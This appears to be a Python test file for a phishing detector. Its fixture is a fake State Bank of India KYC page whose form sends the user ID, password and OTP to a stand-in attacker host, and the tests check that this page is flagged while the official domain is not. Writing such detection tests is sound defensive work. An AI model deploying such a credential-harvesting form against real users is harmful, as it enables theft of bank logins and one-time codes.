from bs4 import BeautifulSoup

from app_service.services.page_inspection import evidence_lines, inspect_page
from ml_service.inference.threat_scorer import ThreatScorer

PHISH = """<html><head><title>SBI Net Banking - KYC Update</title></head><body>
<h1>State Bank of India</h1><p>SBI KYC update</p>
<form action="https://collector.evil-host.top/save" method="post">
  <input name="userid" placeholder="User ID"><input type="password" name="pwd">
  <input name="otp" placeholder="Enter OTP"><button>Verify</button>
</form></body></html>"""

REAL = """<html><head><title>SBI</title></head><body><p>SBI</p>
<form action="/login"><input name="userid"><input type="password" name="pwd"></form></body></html>"""


def test_phishing_page_is_caught():
    r = inspect_page(BeautifulSoup(PHISH, "html.parser"), "http://sbi-kyc-update.xyz/login")
    assert {"password", "OTP"} <= set(r["sensitive_fields"])
    assert r["form_posts_to"] == ["collector.evil-host.top"]
    assert r["impersonated_brand"] == "SBI"
    text = "URL: http://sbi-kyc-update.xyz/login\n" + "\n".join(evidence_lines(r))
    assert ThreatScorer().assess(0.3, text.lower().split(), text).threat_score > 0.9


def test_official_domain_is_not_called_impersonation():
    r = inspect_page(BeautifulSoup(REAL, "html.parser"), "https://www.onlinesbi.sbi/login")
    assert r["impersonated_brand"] is None and r["form_posts_to"] == []
